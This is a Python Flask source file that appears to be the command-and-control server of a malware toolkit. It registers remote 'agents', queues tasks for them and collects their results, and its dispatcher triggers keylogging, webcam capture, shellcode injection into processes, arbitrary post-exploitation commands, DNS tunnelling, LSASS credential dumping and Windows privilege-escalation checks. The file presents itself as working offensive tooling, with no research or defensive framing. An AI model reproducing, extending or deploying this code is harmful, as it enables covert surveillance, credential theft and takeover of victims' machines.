from flask import Flask, render_template, request, jsonify
from modules.shellcode import ShellcodeGenerator
from modules.evasion import Evasion
from modules.keylogger import Keylogger
from modules.webcam import WebcamCapture
from modules.process_injection import ProcessInjector
from modules.post_exploit import PostExploit
from modules.dns_tunnel import DNSTunnel
from modules.credential_dump import CredentialDump
from modules.priv_esc import PrivilegeEscalation
import os
import threading
import logging
from datetime import datetime

app = Flask(__name__)

# Initialize global instances
shellcode_gen = ShellcodeGenerator()
evasion = Evasion()
keylogger = Keylogger()
webcam = WebcamCapture()
process_injector = ProcessInjector()
post_exploit = PostExploit()
dns_tunnel = DNSTunnel("example.com")  # Replace with actual domain
cred_dump = CredentialDump()
priv_esc = PrivilegeEscalation()

# Global storage for agents and tasks
agents = {}
tasks = {}
results = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/agents', methods=['GET'])
def list_agents():
    return jsonify(list(agents.values()))

@app.route('/api/agents/register', methods=['POST'])
def register_agent():
    data = request.get_json()
    agent_id = data.get('agent_id')
    if agent_id:
        agents[agent_id] = data
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error'}), 400

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    agent_tasks = tasks.get(agent_id, [])
    return jsonify(agent_tasks)

@app.route('/api/tasks', methods=['POST'])
def create_task():
    data = request.get_json()
    agent_id = data.get('agent_id')
    task_type = data.get('type')
    task_data = data.get('data', {})
    
    if not agent_id or not task_type:
        return jsonify({'status': 'error'}), 400
        
    task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    task = {
        'id': task_id,
        'type': task_type,
        'data': task_data,
        'status': 'pending',
        'timestamp': datetime.now().isoformat()
    }
    
    if agent_id not in tasks:
        tasks[agent_id] = []
    tasks[agent_id].append(task)
    
    # Execute task in background
    thread = threading.Thread(
        target=execute_task,
        args=(agent_id, task_id, task_type, task_data),
        daemon=True
    )
    thread.start()
    
    return jsonify({'task_id': task_id})

@app.route('/api/results/<task_id>', methods=['GET'])
def get_result(task_id):
    result = results.get(task_id)
    if result:
        return jsonify(result)
    return jsonify({'status': 'not_found'}), 404

@app.route('/api/results', methods=['POST'])
def submit_result():
    data = request.get_json()
    task_id = data.get('task_id')
    agent_id = data.get('agent_id')
    result = data.get('result')
    
    if task_id and result:
        results[task_id] = {
            'agent_id': agent_id,
            'result': result,
            'timestamp': datetime.now().isoformat()
        }
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error'}), 400

def execute_task(agent_id, task_id, task_type, task_data):
    try:
        result = None
        
        if task_type == 'keylogger':
            result = keylogger.start()
        elif task_type == 'webcam':
            result = webcam.capture()
        elif task_type == 'process_injection':
            result = process_injector.inject(
                task_data.get('process'),
                task_data.get('shellcode')
            )
        elif task_type == 'post_exploit':
            result = post_exploit.execute(task_data.get('command'))
        elif task_type == 'dns_tunnel':
            result = dns_tunnel.start_tunnel()
        elif task_type == 'credential_dump':
            result = cred_dump.dump_lsass()
        elif task_type == 'privilege_escalation':
            result = priv_esc.check_windows_services()
            
        if result:
            results[task_id] = {
                'agent_id': agent_id,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }
            
    except Exception as e:
        logging.error(f"Error executing task: {str(e)}")
        results[task_id] = {
            'agent_id': agent_id,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001) 